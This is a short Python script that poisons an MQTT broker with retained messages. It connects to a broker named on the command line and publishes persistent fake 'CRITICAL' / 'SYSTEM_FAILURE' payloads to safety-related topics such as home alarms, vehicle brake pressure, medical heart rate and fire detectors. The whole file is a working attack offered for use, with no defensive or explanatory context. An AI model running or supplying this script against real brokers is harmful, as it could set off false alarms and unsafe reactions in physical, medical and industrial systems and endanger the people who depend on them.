#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

def on_connect(client, userdata, flags, rc):
    critical_topics = [
        "home/alarm/status",
        "factory/sensor/temperature",
        "vehicle/brake/pressure",
        "medical/heartrate",
        "building/fire/detector",
        "industrial/motor/rpm"
    ]
    
    # Publica mensagens RETIDAS falsas que persistem no broker
    for topic in critical_topics:
        poisoned_payload = '{"status":"CRITICAL","value":9999,"alert":"SYSTEM_FAILURE"}'
        client.publish(topic, poisoned_payload, qos=2, retain=True)
        print(f"[!] Poisoned retained message on: {topic}")
        time.sleep(0.2)
    
    print("[✓] Retained message poisoning completed")
    time.sleep(2)
    client.disconnect()

if __name__ == "__main__":
    import sys
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.connect(broker, 1883, 60)
    client.loop_forever()